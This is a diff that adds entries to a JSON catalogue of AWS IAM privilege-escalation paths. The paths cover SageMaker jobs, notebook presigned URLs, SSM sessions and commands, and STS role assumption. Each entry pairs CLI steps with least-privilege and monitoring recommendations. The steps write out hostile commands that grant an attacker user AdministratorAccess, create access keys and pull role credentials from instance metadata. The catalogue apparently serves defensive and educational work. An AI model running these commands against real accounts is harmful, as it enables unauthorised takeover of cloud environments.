+      "admin": [
+        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)",
+        "An S3 bucket must be accessible to store training data and output"
+      ],
+      "lateral": [
+        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
+        "An S3 bucket must be accessible to store training data and output"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "echo '#!/bin/bash\naws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n' > exploit.sh && chmod +x exploit.sh\n",
+          "description": "Create a malicious training script that escalates privileges"
+        },
+        {
+          "step": 2,
+          "command": "aws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh\n",
+          "description": "Upload the malicious script to S3"
+        },
+        {
+          "step": 3,
+          "command": "aws sagemaker create-training-job \\\n  --training-job-name privesc-training \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \\\n  --input-data-config '[{\"ChannelName\":\"training\",\"DataSource\":{\"S3DataSource\":{\"S3DataType\":\"S3Prefix\",\"S3Uri\":\"s3://BUCKET_NAME/exploit/\"}}}]' \\\n  --output-data-config S3OutputPath=s3://BUCKET_NAME/output \\\n  --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \\\n  --stopping-condition MaxRuntimeInSeconds=1800\n",
+          "description": "Create a training job with the privileged role that executes the malicious script"
+        },
+        {
+          "step": 4,
+          "command": "aws sagemaker describe-training-job --training-job-name privesc-training",
+          "description": "Monitor the training job status and wait for execution"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `sagemaker:CreateTrainingJob` permissions\n- Monitor CloudTrail for SageMaker training job creation with privileged roles\n- Use VPC configuration to isolate training jobs\n- Restrict S3 access for training data sources\n- Alert on training jobs with administrative roles being created\n- Use container image signing and validation\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - SageMaker PassRole",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "sagemaker-001",
+      "sagemaker-003"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "sagemaker:CreateTrainingJob",
+          "resourceConstraints": "Must have permission to create SageMaker training jobs"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "sagemaker-003",
+    "name": "iam:PassRole + sagemaker:CreateProcessingJob",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "sagemaker"
+    ],
+    "description": "A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing script, the attacker can execute code with elevated privileges.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)",
+        "An S3 bucket must be accessible to store input/output data"
+      ],
+      "lateral": [
+        "A role must exist that trusts sagemaker.amazonaws.com to assume it",
+        "An S3 bucket must be accessible to store input/output data"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "echo '#!/bin/bash\naws iam create-access-key --user-name attacker\n' > process.sh && chmod +x process.sh\n",
+          "description": "Create a malicious processing script that creates access keys for privilege escalation"
+        },
+        {
+          "step": 2,
+          "command": "aws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh\n",
+          "description": "Upload the malicious script to S3"
+        },
+        {
+          "step": 3,
+          "command": "aws sagemaker create-processing-job \\\n  --processing-job-name privesc-processing \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --app-specification ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh \\\n  --processing-inputs '[{\"InputName\":\"code\",\"S3Input\":{\"S3Uri\":\"s3://BUCKET_NAME/processing/\",\"LocalPath\":\"/opt/ml/processing/input\",\"S3DataType\":\"S3Prefix\",\"S3InputMode\":\"File\"}}]' \\\n  --processing-outputs '[{\"OutputName\":\"output\",\"S3Output\":{\"S3Uri\":\"s3://BUCKET_NAME/output\",\"LocalPath\":\"/opt/ml/processing/output\",\"S3UploadMode\":\"EndOfJob\"}}]' \\\n  --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}\n",
+          "description": "Create a processing job with the privileged role that executes the malicious script"
+        },
+        {
+          "step": 4,
+          "command": "aws sagemaker describe-processing-job --processing-job-name privesc-processing",
+          "description": "Monitor the processing job status and wait for execution"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `sagemaker:CreateProcessingJob` permissions\n- Monitor CloudTrail for SageMaker processing job creation with privileged roles\n- Use VPC configuration to isolate processing jobs\n- Restrict S3 access for processing data sources\n- Alert on processing jobs with administrative roles being created\n- Use container image signing and validation\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - SageMaker PassRole",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "sagemaker-001",
+      "sagemaker-002"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "sagemaker:CreateProcessingJob",
+          "resourceConstraints": "Must have permission to create SageMaker processing jobs"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "sagemaker-004",
+    "name": "sagemaker:CreatePresignedNotebookInstanceUrl",
+    "category": "access-resource",
+    "services": [
+      "sagemaker"
+    ],
+    "description": "A principal with `sagemaker:CreatePresignedNotebookInstanceUrl` can generate a presigned URL to access an existing SageMaker notebook instance. If the notebook instance has a privileged execution role attached, the attacker can access the Jupyter environment and execute arbitrary code with the permissions of that role. This does not require creating a new notebook - only accessing an existing one.",
+    "prerequisites": {
+      "admin": [
+        "A SageMaker notebook instance must exist with an administrative execution role",
+        "The notebook instance must be in 'InService' status"
+      ],
+      "lateral": [
+        "A SageMaker notebook instance must exist with a privileged execution role",
+        "The notebook instance must be in 'InService' status"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws sagemaker list-notebook-instances",
+          "description": "List available notebook instances to find targets with privileged roles"
+        },
+        {
+          "step": 2,
+          "command": "aws sagemaker describe-notebook-instance --notebook-instance-name TARGET_NOTEBOOK",
+          "description": "Check the notebook's execution role ARN to confirm it has elevated permissions"
+        },
+        {
+          "step": 3,
+          "command": "aws sagemaker create-presigned-notebook-instance-url \\\n  --notebook-instance-name TARGET_NOTEBOOK\n",
+          "description": "Generate a presigned URL to access the notebook"
+        },
+        {
+          "step": 4,
+          "command": "Open the presigned URL in a browser and use the Jupyter terminal to execute privileged commands",
+          "description": "Access the notebook and execute commands with the privileged role's permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `sagemaker:CreatePresignedNotebookInstanceUrl` permission using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"sagemaker:CreatePresignedNotebookInstanceUrl\",\n  \"Resource\": \"arn:aws:sagemaker:REGION:ACCOUNT_ID:notebook-instance/SpecificNotebook\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:PrincipalAccount\": \"ACCOUNT_ID\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `CreatePresignedNotebookInstanceUrl` events on sensitive notebooks\n- Use notebook lifecycle configurations to restrict capabilities\n- Implement VPC configuration to isolate notebook instances\n- Alert on presigned URL creation for notebooks with privileged roles\n- Regularly audit notebook instance execution roles and remove excessive permissions\n- Use SCPs to restrict notebook access patterns\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - SageMaker Presigned URL",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "sagemaker-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "sagemaker:CreatePresignedNotebookInstanceUrl",
+          "resourceConstraints": "Must have permission to create presigned URLs for the target notebook instance"
+        }
+      ]
+    }
+  },
+  {
+    "id": "ssm-001",
+    "name": "ssm:StartSession",
+    "category": "access-resource",
+    "services": [
+      "ssm",
+      "ec2"
+    ],
+    "description": "The `ssm:StartSession` permission allows a principal to remotely access any EC2 instance on which they have this permission. This access is contingent on the EC2 instance having the SSM agent installed and running, possessing the AmazonSSMManagedInstanceCore policy or equivalent permissions, and being in a running state. This permission provides SSH-like access via the AWS API. Consequently, the initiating principal may gain additional IAM permissions associated with the accessed instances. If an instance has a privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that role, thereby escalating their own permissions.",
+    "prerequisites": {
+      "admin": [
+        "EC2 instance must exist and be running",
+        "EC2 instance must have SSM agent installed and running",
+        "EC2 instance must have an instance profile attached to an IAM role",
+        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent",
+        "Target EC2 instance must have a role with administrative permissions attached"
+      ],
+      "lateral": [
+        "EC2 instance must exist and be running",
+        "EC2 instance must have SSM agent installed and running",
+        "EC2 instance must have an instance profile attached to an IAM role",
+        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws ssm start-session --target i-XXXXXXXXXXX",
+          "description": "Start an interactive SSM session on the target EC2 instance"
+        },
+        {
+          "step": 2,
+          "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "description": "Retrieve the role name from the instance metadata"
+        },
+        {
+          "step": 3,
+          "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME",
+          "description": "Steal the temporary credentials for the instance's IAM role"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `ssm:StartSession` using the principle of least privilege. Use the\nResource and Condition elements in IAM policies to limit which instances a principal\ncan start sessions on. Monitor use of this sensitive permission using CloudSIEM detections.\n",
+    "discoveredBy": {
+      "name": "Unknown",
+      "organization": "Unknown"
+    },
+    "references": [
+      {
+        "title": "PMapper SSM Edges",
+        "url": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ssm_edges.py"
+      },
+      {
+        "title": "IAM Vulnerable - SSM StartSession",
+        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc-ssmStartSession.tf"
+      }
+    ],
+    "relatedPaths": [
+      "ssm-002"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "ssm:StartSession",
+          "resourceConstraints": "Target EC2 instance must be in the Resource section"
+        }
+      ]
+    }
+  },
+  {
+    "id": "ssm-002",
+    "name": "ssm:SendCommand",
+    "category": "access-resource",
+    "services": [
+      "ssm",
+      "ec2"
+    ],
+    "description": "The `ssm:SendCommand` permission allows a principal to execute commands on any EC2 instance on which they have this permission, using SSM Run Command. This access is contingent on the EC2 instance having the SSM agent installed, possessing the AmazonSSMManagedInstanceCore policy (or equivalent permissions), and being in a running state. If an instance has a privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that role, thereby escalating their own permissions.",
+    "prerequisites": {
+      "admin": [
+        "EC2 instance must exist and be running",
+        "EC2 instance must have SSM agent installed",
+        "EC2 instance must have an instance profile attached to an IAM role",
+        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent",
+        "Target EC2 instance must have a role with administrative permissions attached"
+      ],
+      "lateral": [
+        "EC2 instance must exist and be running",
+        "EC2 instance must have SSM agent installed",
+        "EC2 instance must have an instance profile attached to an IAM role",
+        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws ssm send-command --instance-ids \"i-XXXXXXXXXXX\" --document-name \"AWS-RunShellScript\" --comment \"Stealing IAM credentials\" --parameters commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME\"]",
+          "description": "Send a command to steal the IAM role credentials from instance metadata"
+        },
+        {
+          "step": 2,
+          "command": "aws ssm get-command-invocation --command-id @command-id --instance-id i-XXXXXXXXXXX",
+          "description": "Retrieve the command output containing the temporary credentials"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `ssm:SendCommand` using the principle of least privilege. Use the\nResource and Condition elements in IAM policies to limit which instances a principal\ncan run commands on and which documents they can use. Monitor use of this sensitive\npermission using CloudSIEM detections.\n",
+    "discoveredBy": {
+      "name": "Unknown",
+      "organization": "Unknown"
+    },
+    "references": [
+      {
+        "title": "IAM Vulnerable - SSM SendCommand",
+        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc-ssmSendCommand.tf"
+      }
+    ],
+    "relatedPaths": [
+      "ssm-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "ssm:SendCommand",
+          "resourceConstraints": "Target EC2 instance must be in the Resource section"
+        }
+      ]
+    }
+  },
+  {
+    "id": "sts-001",
+    "name": "sts:AssumeRole",
+    "category": "lateral-movement",
+    "services": [
+      "sts"
+    ],
+    "description": "A principal with `sts:AssumeRole` permission can assume IAM roles that trust them in their trust policy. If a role with elevated permissions has a trust policy that allows the attacker's principal to assume it, they can gain those elevated permissions by assuming the role. This is one of the most straightforward privilege escalation paths when misconfigured trust relationships exist.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist with administrative permissions (e.g., AdministratorAccess)",
+        "The role's trust policy must allow the attacker's principal (user/role) to assume it"
+      ],
+      "lateral": [
+        "A role must exist with elevated permissions",
+        "The role's trust policy must allow the attacker's principal (user/role) to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam list-roles",
+          "description": "List available roles to find targets with elevated permissions"
+        },
+        {
+          "step": 2,
+          "command": "aws iam get-role --role-name TARGET_ROLE",
+          "description": "Check the role's trust policy to confirm the attacker can assume it"
+        },
+        {
+          "step": 3,
+          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \\\n  --role-session-name privesc-session\n",
+          "description": "Assume the privileged role to obtain temporary credentials"
+        },
+        {
+          "step": 4,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 3>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 3>\nexport AWS_SESSION_TOKEN=<SessionToken from step 3>\n",
+          "description": "Configure the AWS CLI to use the assumed role credentials"
+        },
+        {
+          "step": 5,
+          "command": "aws sts get-caller-identity",
+          "description": "Verify the assumed role identity and elevated permissions"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run iam__enum_permissions",
+          "description": "Enumerate IAM permissions and identify assumable roles"
+        },
+        {
+          "step": 2,
+          "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
+          "description": "Assume the privileged role using Pacu"
+        }
+      ]
+    },
+    "recommendation": "Carefully audit IAM role trust policies to ensure they follow the principle of least privilege.\nOnly allow trusted principals to assume sensitive roles.\n\nExample restrictive trust policy:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificTrustedRole\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"sts:ExternalId\": \"unique-external-id\"\n        },\n        \"IpAddress\": {\n          \"aws:SourceIp\": \"203.0.113.0/24\"\n        }\n      }\n    }\n  ]\n}\n```\n\nAdditional controls:\n- Use external IDs for cross-account role assumptions\n- Implement IP address restrictions in trust policies\n- Require MFA for sensitive role assumptions\n- Monitor CloudTrail for `AssumeRole` events on privileged roles\n- Regularly audit role trust policies with AWS IAM Access Analyzer\n- Alert on unusual assume-role patterns\n- Use SCPs to restrict which roles can be assumed\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - AssumeRole",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "iam-002",
+      "iam-003",
+      "iam-004"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true,
+      "pacu": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "sts:AssumeRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section and the role's trust policy must allow the principal to assume it"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListUsers",
+          "resourceConstraints": "Helpful for discovering target users"
+        },
+        {
+          "permission": "iam:GetUser",
+          "resourceConstraints": "Useful for viewing user details"
+        }
+      ]
+    }
+  }
+]
